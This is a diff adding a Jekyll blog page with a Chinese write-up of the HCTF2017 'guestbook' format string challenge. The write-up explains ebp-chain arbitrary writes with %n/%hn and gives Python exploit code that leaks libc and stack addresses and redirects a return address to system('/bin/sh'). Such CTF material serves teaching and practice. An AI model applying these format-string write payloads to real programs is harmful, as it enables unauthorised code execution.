@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>HCTF2017guestbook</title>
+  <meta name="description" content="关于HCTF2017的guestbook的一点总结">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/jekyll/update/2019/01/02/HCTF2017guestbook.html">
+  <link rel="alternate" type="application/rss+xml" title="Your awesome title" href="http://localhost:4000/feed.xml">
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Your awesome title</a>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      <div class="trigger">
+        
+          
+          <a class="page-link" href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+        
+      </div>
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">HCTF2017guestbook</h1>
+    <p class="post-meta"><time datetime="2019-01-02T21:01:05+08:00" itemprop="datePublished">Jan 2, 2019</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <h1 id="hctf2017-guestbook">关于HCTF2017的guestbook的一点总结</h1>
+
+<p>一道很明显的格式化字符串漏洞的题目，然后我在如何利用这块想了很久，总结一下经验吧。。。</p>
+
+<h2 id="dword-word-shoot">通过格式化字符串漏洞进行DWORD/WORD SHOOT</h2>
+
+<p>因为是格式化字符串漏洞，（很明显see那里有格式化字符串漏洞，）可以利用ebp chain进行dword shoot，具体实现代码如下：</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#pre: iDst and iNum is smaller than 0x7fffffff</span>
+<span class="c">#the next two gust index is 2 and 3</span>
+<span class="k">def</span> <span class="nf">dword_shoot</span><span class="p">(</span><span class="n">iDst</span><span class="p">,</span> <span class="n">iNum</span><span class="p">,</span> <span class="n">idx1</span><span class="p">,</span> <span class="n">idx2</span><span class="p">):</span>
+    <span class="n">add_guest</span><span class="p">(</span><span class="s">"</span><span class="si">%</span><span class="s">"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">iDst</span><span class="p">)</span><span class="o">+</span><span class="s">"x</span><span class="si">%72</span><span class="s">$n"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
+    <span class="n">add_guest</span><span class="p">(</span><span class="s">"</span><span class="si">%</span><span class="s">"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">iNum</span><span class="p">)</span><span class="o">+</span><span class="s">"x</span><span class="si">%80</span><span class="s">$n"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
+    <span class="n">see_guest</span><span class="p">(</span><span class="n">idx1</span><span class="p">)</span>
+    <span class="n">see_guest</span><span class="p">(</span><span class="n">idx2</span><span class="p">)</span>
+    <span class="n">del_guest</span><span class="p">(</span><span class="n">idx1</span><span class="p">)</span>
+    <span class="n">del_guest</span><span class="p">(</span><span class="n">idx2</span><span class="p">)</span>
+<span class="c">#iNum &lt; 0x7fffffff</span>
+<span class="k">def</span> <span class="nf">stack_shoot_dword</span><span class="p">(</span><span class="n">addr_72</span><span class="p">,</span> <span class="n">displacement</span><span class="p">,</span> <span class="n">iNum</span><span class="p">,</span> <span class="n">idx1</span><span class="p">,</span> <span class="n">idx2</span><span class="p">):</span>
+    <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">addr_72</span> <span class="o">+</span> <span class="n">displacement</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
+    <span class="n">add_guest</span><span class="p">(</span><span class="s">"</span><span class="si">%</span><span class="s">"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="o">+</span><span class="s">"x</span><span class="si">%72</span><span class="s">$hn"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
+    <span class="n">add_guest</span><span class="p">(</span><span class="s">"</span><span class="si">%</span><span class="s">"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">iNum</span><span class="p">)</span><span class="o">+</span><span class="s">"x</span><span class="si">%80</span><span class="s">$n"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
+    <span class="n">see_guest</span><span class="p">(</span><span class="n">idx1</span><span class="p">)</span>
+    <span class="n">see_guest</span><span class="p">(</span><span class="n">idx2</span><span class="p">)</span>
+    <span class="n">del_guest</span><span class="p">(</span><span class="n">idx1</span><span class="p">)</span>
+    <span class="n">del_guest</span><span class="p">(</span><span class="n">idx2</span><span class="p">)</span>
+<span class="c">#iNum &lt; 0xffff</span>
+<span class="k">def</span> <span class="nf">stack_shoot_word</span><span class="p">(</span><span class="n">addr_72</span><span class="p">,</span> <span class="n">displacement</span><span class="p">,</span> <span class="n">iNum</span><span class="p">,</span> <span class="n">idx1</span><span class="p">,</span> <span class="n">idx2</span><span class="p">):</span>
+    <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">addr_72</span> <span class="o">+</span> <span class="n">displacement</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
+    <span class="n">add_guest</span><span class="p">(</span><span class="s">"</span><span class="si">%</span><span class="s">"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="o">+</span><span class="s">"x</span><span class="si">%72</span><span class="s">$hn"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
+    <span class="n">add_guest</span><span class="p">(</span><span class="s">"</span><span class="si">%</span><span class="s">"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">iNum</span><span class="p">)</span><span class="o">+</span><span class="s">"x</span><span class="si">%80</span><span class="s">$hn"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
+    <span class="n">see_guest</span><span class="p">(</span><span class="n">idx1</span><span class="p">)</span>
+    <span class="n">see_guest</span><span class="p">(</span><span class="n">idx2</span><span class="p">)</span>
+    <span class="n">del_guest</span><span class="p">(</span><span class="n">idx1</span><span class="p">)</span>
+    <span class="n">del_guest</span><span class="p">(</span><span class="n">idx2</span><span class="p">)</span>
+</code></pre></div>
+<p>72\$指向80\$,所以第一步先把80$处的地址写为我们的目标地址，然后下一次用这个地址进行任意地址写入（dword shoot）</p>
+
+<p>然后是stack dword shoot，这个就有点麻烦了，因为貌似写入超过0x7fffffff的数会写入失败snprintf返回-1,而栈的基址一般都是大于这个值的，但是，有一个叫做hn的操作：只写入一个word，所以我们可以利用ebp chain的值的高16位都是栈的基址这点(不准确吧，不过反正就是栈那块的地址)，只对80$处的低16位进行写入，所以可以向栈中高16位是ebp chain的高16位的那块区域写入任意数据。addr_72是通过%u获取的72的值，displacement是相对那个所获取出来的值的偏移，这个地方会被写入一个word或者dword。。。</p>
+
+<p>但是有个前提，就是调用dword_shoot之后，80$处的数据会被污染(高16位被破坏)，所以stack_shoot就不再奏效。。。</p>
+
+<h2 id=">本题解题思路</h2>
+
+<h3 id="got">GOT表覆盖</h3>
+
+<p>一开始我是想覆盖GOT表地址(free变成system)，把某个phone的指针(本来指向堆)变成指向.data段的&quot;/bin/sh&quot;，可以通过将name设置成&quot;/bin/sh&quot;来实现。但是这是e8的call，是通过相对偏移调用的，而不是GOT表，所以失败</p>
+
+<h3 id=">比较麻烦的方法</h3>
+
+<p>这个方法比较麻烦，也与预期的方法不一样，但还是记录一下吧。</p>
+
+<p>首先，目标是调用see_guest时，将返回地址写入成system的地址，并在返回地址+8处写入&quot;/bin/sh&quot;作为其第一个参数</p>
+
+<p>然而system的地址也是大于0x7fffffff的，所以要分两部分来word shoot，刚好有两个格式化字符串漏洞，然而phone是限制只能是数字的，所以可以先把phone的指针设为指向另一个guest的name，这个name也是进行word shoot的payload。一个射高16位，一个射低16位，完成目标，返回时执行到system(&quot;/bin/sh&quot;)</p>
+
+<p>然而，我们需要在栈中先放置 返回地址 和 返回地址+2 的值，这样才能通过%xx$hn进行shoot，所以要先把它们stack_shoot_word到栈中。（因为栈的地址大于0x7fffffff，所以要找个高16位是那块区域的地址，修改其低16位使其指向返回地址和返回地址+2）</p>
+
+<p>还有就是，我们所shoot的位置里面的内容必须要保持不变，就是，因为要各种add see del，如果这些操作会改变我们shoot位置的值，就不能shoot那里。这个具体可以调试器手动改一下然后随便搞些操作看下会不会被修改。。。</p>
+
+<p>具体实现代码如下：</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">add_guest</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span> <span class="c">#index 0</span>
+<span class="n">add_guest</span><span class="p">(</span><span class="s">"</span><span class="si">%1</span><span class="s">$u </span><span class="si">%72</span><span class="s">$u </span><span class="si">%3</span><span class="s">$u"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span> <span class="c">#index 1</span>
+<span class="n">szName</span> <span class="o">=</span> <span class="n">see_guest</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">del_guest</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">get_libc_base</span><span class="p">(</span><span class="n">szName</span><span class="p">)</span>
+<span class="n">guestbook</span> <span class="o">=</span> <span class="n">get_guest_base</span><span class="p">(</span><span class="n">szName</span><span class="p">)</span>
+<span class="n">from_72</span> <span class="o">=</span> <span class="n">get_stack_from_72</span><span class="p">(</span><span class="n">szName</span><span class="p">)</span>
+<span class="c">#获取各种基址</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x03ada0</span> <span class="c"># given 0x0003a940，这个是我电脑上的，题目给的是注释里面那个。。。</span>
+<span class="n">guestStruct</span> <span class="o">=</span> <span class="n">guestbook</span><span class="o">+</span><span class="mh">0x3040</span>
+<span class="n">phoneStruct</span> <span class="o">=</span> <span class="n">guestbook</span><span class="o">+</span><span class="mh">0x3063</span>
+<span class="n">structSize</span> <span class="o">=</span> <span class="mh">0x28</span> <span class="c"># both struct are 0x28</span>
+<span class="c"># +1 is the pointer to the phone in the heap</span>
+<span class="c"># +4 is the array of the name</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="n">from_72</span> <span class="o">-</span> <span class="mi">7</span> <span class="o">*</span> <span class="mi">4</span>
+
+<span class="n">add_guest</span><span class="p">(</span><span class="s">"</span><span class="si">%</span><span class="s">"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">system_addr</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="s">"x</span><span class="si">%87</span><span class="s">$hn"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span> <span class="c"># index 1</span>
+<span class="c">#correspond to 14 that is going to be return addr + 2</span>
+<span class="n">add_guest</span><span class="p">(</span><span class="s">"</span><span class="si">%</span><span class="s">"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">system_addr</span><span class="o">&amp;</span><span class="mh">0xffff</span><span class="p">)</span><span class="o">+</span><span class="s">"x</span><span class="si">%84</span><span class="s">$hn"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span> <span class="c"># index 2</span>
+<span class="c">#correspond to 8 that is going to be ret addr</span>
+
+<span class="n">stack_shoot_word</span><span class="p">(</span><span class="n">from_72</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+<span class="n">stack_shoot_word</span><span class="p">(</span><span class="n">from_72</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="p">(</span><span class="n">ret</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+<span class="c">#change 8 14 into the ret addr and ret addr+2</span>
+
+<span class="n">stack_shoot_dword</span><span class="p">(</span><span class="n">from_72</span><span class="p">,</span> <span class="o">-</span><span class="mi">5</span><span class="p">,</span> <span class="n">guestStruct</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+<span class="c">#shoot addr of "/bin/sh" into the position that is going to be the first argument</span>
+
+<span class="n">dword_shoot</span><span class="p">(</span><span class="n">phoneStruct</span><span class="o">+</span><span class="n">structSize</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">guestStruct</span><span class="o">+</span><span class="n">structSize</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+<span class="c">#shoot shoot the index 1 phone as name of index 2</span>
+
+<span class="c"># see 1,然后覆盖返回地址为system，执行system("/bin/sh")</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"input the guest index:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div>
+<h2 id=">经验总结</h2>
+
+<ol>
+<li>一开始有个地方(del_guest)我用了recv而不是recvuntil，导致了有时成功有时失败。其实这是流的粘包与否的不确定性所造的孽。。。比方说，还没收完puts出来的字符串，就sh.recv()返回了。。。然后send再recv()把刚才的收完，再send，这个时候就会出错。。。（自己脑补一下吧。。。）</li>
+<li>面对这种比较复杂的exploit方法，还是多模块化封装比较好。。。不然会晕。。。</li>
+<li>其实想了另外一种exploit方法，就是stack_shoot_dword所存储的ebp，使得函数返回后，ebp被劫持，然后这里如果再通过[ebp-xxx]访问局部变量的话，会访问到我们指定的地址。。。比方说mov [ebp-0x10],xxx，如果这个xxx我们可以控制，ebp也能通过格式化字符串漏洞控制，那么就也能造成一个dword shoot。。。</li>
+</ol>
+
+  </div>
+
+</article>
+
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Your awesome title</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li>Your awesome title</li>
+          <li><a href="mailto:your-email@domain.com">your-email@domain.com</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-2">
+        <ul class="social-media-list">
+          
+          <li>
+            <a href="https://github.com/jekyll"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span><span class="username">jekyll</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://twitter.com/jekyllrb"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span><span class="username">jekyllrb</span></a>
+
+          </li>
+          
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-3">
+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
+</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
